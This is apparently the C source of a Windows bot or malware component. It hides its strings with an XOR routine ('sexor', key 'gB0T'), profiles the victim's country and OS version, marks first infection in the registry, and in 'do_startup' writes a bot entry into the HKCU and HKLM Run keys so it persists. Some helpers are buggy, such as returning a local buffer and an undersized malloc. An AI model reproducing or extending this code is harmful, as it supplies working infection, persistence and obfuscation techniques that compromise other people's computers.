#include "StdAfx.h"


char *GetCountry()
{
	char szRet[MAX_PATH];
	DWORD dwSize = 4;

	strcpy(szRet, "");
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, szRet, sizeof(szRet));
	if (szRet == NULL) {
		strcpy(szRet, "ERR|");
	} else {
		strcat(szRet, "|");
	}
	szRet[4] = 0;

	return szRet;
}

char *GetOperatingSystem(Injdat *pInj)
{
	NOSVERSIONINFOEX OSVi;
	OSVi.dwOSVersionInfoSize=sizeof(NOSVERSIONINFOEX);
	if ( GetVersionEx((OSVERSIONINFO *)&OSVi ) ) {
		if( OSVi.dwMajorVersion == 5 && OSVi.dwMinorVersion == 0 ) {
			memset(pInj->Vars.Others.szFullOperatingSystem, 0, sizeof(pInj->Vars.Others.szFullOperatingSystem));
			strcpy(pInj->Vars.Others.szFullOperatingSystem, sexor("é×ÐÚÑÉÍžŒõ", "gB0T"));
			return "2K";
		} else if( OSVi.dwMajorVersion ==5 && OSVi.dwMinorVersion == 1 ) {
			memset(pInj->Vars.Others.szFullOperatingSystem, 0, sizeof(pInj->Vars.Others.szFullOperatingSystem));
			strcpy(pInj->Vars.Others.szFullOperatingSystem, sexor("é×ÐÚÑÉÍžæî", "gB0T"));
			return "XP";
		} else if ( OSVi.dwMajorVersion == 5 && OSVi.dwMinorVersion == 2 ) {
			memset(pInj->Vars.Others.szFullOperatingSystem, 0, sizeof(pInj->Vars.Others.szFullOperatingSystem));
			strcpy(pInj->Vars.Others.szFullOperatingSystem, sexor("é×ÐÚÑÉÍžŒŽŽ", "gB0T"));
			return "2K3";
		} else if( OSVi.dwMajorVersion == 6 && OSVi.dwMinorVersion == 0 && OSVi.wProductType == VER_NT_WORKSTATION ) {
			memset(pInj->Vars.Others.szFullOperatingSystem, 0, sizeof(pInj->Vars.Others.szFullOperatingSystem));
			strcpy(pInj->Vars.Others.szFullOperatingSystem, sexor("é×ÐÚÑÉÍžè×ÍÊß", "gB0T"));
			return "VIS";
		} else if( OSVi.dwMajorVersion == 6 && OSVi.dwMinorVersion == 0 && OSVi.wProductType != VER_NT_WORKSTATION ) {
			memset(pInj->Vars.Others.szFullOperatingSystem, 0, sizeof(pInj->Vars.Others.szFullOperatingSystem));
			strcpy(pInj->Vars.Others.szFullOperatingSystem, sexor("é×ÐÚÑÉÍžŒŽŽ†", "gB0T"));
			return "2K8";
		} else if( OSVi.dwMajorVersion == 6 && OSVi.dwMinorVersion == 1 && OSVi.wProductType == VER_NT_WORKSTATION ) {
			memset(pInj->Vars.Others.szFullOperatingSystem, 0, sizeof(pInj->Vars.Others.szFullOperatingSystem));
			strcpy(pInj->Vars.Others.szFullOperatingSystem, sexor("é×ÐÚÑÉÍž‰", "gB0T"));
			return "W7";
		} else if( OSVi.dwMajorVersion == 6 && OSVi.dwMinorVersion == 1 && OSVi.wProductType != VER_NT_WORKSTATION ) {
			memset(pInj->Vars.Others.szFullOperatingSystem, 0, sizeof(pInj->Vars.Others.szFullOperatingSystem));
			strcpy(pInj->Vars.Others.szFullOperatingSystem, sexor("é×ÐÚÑÉÍžŒŽŽ†", "gB0T"));
			return "2K8";
		} else {
			memset(pInj->Vars.Others.szFullOperatingSystem, 0, sizeof(pInj->Vars.Others.szFullOperatingSystem));
			strcpy(pInj->Vars.Others.szFullOperatingSystem, "ERR");
			return "ERR";
		}
	}
	memset(pInj->Vars.Others.szFullOperatingSystem, 0, sizeof(pInj->Vars.Others.szFullOperatingSystem));
	strcpy(pInj->Vars.Others.szFullOperatingSystem, "ERR");
	return "ERR";
}

bool key_exists(Injdat pInj, HKEY tree, const char *folder, char *key)
{
	long lRet;
	HKEY hKey;
	char cTemp[150];
	DWORD dwBufLen;
	
	lRet = pInj.API.RegOpenKeyEx(tree, folder, 0, KEY_QUERY_VALUE, &hKey );
	if (lRet != ERROR_SUCCESS) {
		pInj.API.RegCloseKey(hKey);
		return FALSE;
	}
	dwBufLen = sizeof(cTemp);
	lRet = pInj.API.RegQueryValueEx( hKey, key, NULL, NULL, (BYTE*)&cTemp, &dwBufLen );
	if (lRet != ERROR_SUCCESS) {
		pInj.API.RegCloseKey(hKey);
		return FALSE;
	}
	lRet = pInj.API.RegCloseKey( hKey );
	if (lRet != ERROR_SUCCESS) {
		pInj.API.RegCloseKey(hKey);
		return FALSE;
	}
	pInj.API.RegCloseKey(hKey);	
	return TRUE;
}

int reg_edit(Injdat pInj, HKEY tree, DWORD dwKeyType, char *szKeyPath, char *szKeyName, BYTE *bKeyValue)
{
	if (((dwKeyType != REG_DWORD) && (dwKeyType != REG_SZ))) {
		return FALSE;
	}
	
	HKEY key;
	if (pInj.API.RegCreateKeyEx(tree, szKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL) != ERROR_SUCCESS) {
		pInj.API.RegCloseKey(tree);
		return FALSE;
	}
	
	if (dwKeyType == REG_DWORD) {
		pInj.API.RegSetValueEx(key, szKeyName, 0, REG_DWORD, (LPBYTE)&bKeyValue, sizeof(bKeyValue));
	} else if (dwKeyType == REG_SZ) {
		char *szKeyString = (char *)malloc(sizeof(char *));
		memset(szKeyString, 0, sizeof(szKeyString));
		sprintf(szKeyString, "%s", bKeyValue);
		pInj.API.RegSetValueEx(key, szKeyName, 0, REG_SZ, (unsigned char *)szKeyString, strlen(szKeyString));	
		free(szKeyString);
	}
	
	pInj.API.RegCloseKey(key);
	
	return 1;
}

bool is_new(Injdat pInj)
{
	char *folder = sexor("íÑØÊÉßÌÛâó×ÝÌÑÍÑØÊâé×ÐÚÑÉÍâýËÌÌÛÐÊèÛÌÍ×ÑÐâÿÎÎ", "gB0T");
	char *keyname = "new";
	
	if (key_exists(pInj, HKEY_CURRENT_USER, folder, keyname) == FALSE) {
		reg_edit(pInj, HKEY_CURRENT_USER, REG_SZ, folder, keyname, (BYTE *)"yes");
		return TRUE;
	}
	
	return FALSE;
}


int do_startup(Injdat pInj, char *szLocation, char *szBotRunKey, int Bit)
{
	char *runfolder = sexor("íÑØÊÉßÌÛâó×ÝÌÑÍÑØÊâé×ÐÚÑÉÍâýËÌÌÛÐÊèÛÌÍ×ÑÐâìËÐ", "gB0T");
	HKEY Key;
	char szTemp[1024];

	DWORD dwSize = strlen(szLocation);
	
	if (Bit == 64) {
		if (pInj.API.RegOpenKeyEx(HKEY_CURRENT_USER, runfolder, 0, KEY_ALL_ACCESS, &Key) == ERROR_SUCCESS)
		{
			if (!pInj.API.RegSetValueEx(Key, szBotRunKey, 0, REG_SZ, (BYTE *)szLocation, dwSize) == ERROR_SUCCESS) {
				pInj.API.RegCloseKey(Key);
			}
			pInj.API.RegCloseKey(Key);
		}
	} else {
		if (pInj.API.RegOpenKeyEx(HKEY_LOCAL_MACHINE, runfolder, 0, KEY_ALL_ACCESS, &Key) == ERROR_SUCCESS)
		{
			if (!pInj.API.RegSetValueEx(Key, szBotRunKey, 0, REG_SZ, (BYTE *)szLocation, dwSize) == ERROR_SUCCESS) {
				pInj.API.RegCloseKey(Key);
			}
			pInj.API.RegCloseKey(Key);
		} 
		if (pInj.API.RegOpenKeyEx(HKEY_CURRENT_USER, runfolder, 0, KEY_ALL_ACCESS, &Key) == ERROR_SUCCESS)
		{
			if (!pInj.API.RegSetValueEx(Key, szBotRunKey, 0, REG_SZ, (BYTE *)szLocation, dwSize) == ERROR_SUCCESS) {
				pInj.API.RegCloseKey(Key);
			}
			pInj.API.RegCloseKey(Key);
		}
	}

	return TRUE;
}


BOOL is_64()
{
	BOOL bIs64BitOS = FALSE;

	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS 

	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle("kernel32"),"IsWow64Process");

    if (NULL != fnIsWow64Process)
    {
        if (!fnIsWow64Process(GetCurrentProcess(),&bIs64BitOS))
        {
            // handle error
			// lets just do the basic check
			DWORD dwSize;
			dwSize = sizeof(void *);
			if (dwSize > 4) {
				return TRUE;
			} else { return FALSE; };
        } else {
			return bIs64BitOS;
		}
    }

	return FALSE;
}


char tolower(char c)
{
	return ((c >= 'A' && c <= 'Z') ? c + 32: c);
}


char *strtolower(char *str)
{
	for (unsigned int i = 0; i < strlen(str); i++) {
		str[i] = (char)tolower(str[i]);
	}
	
	return str;
}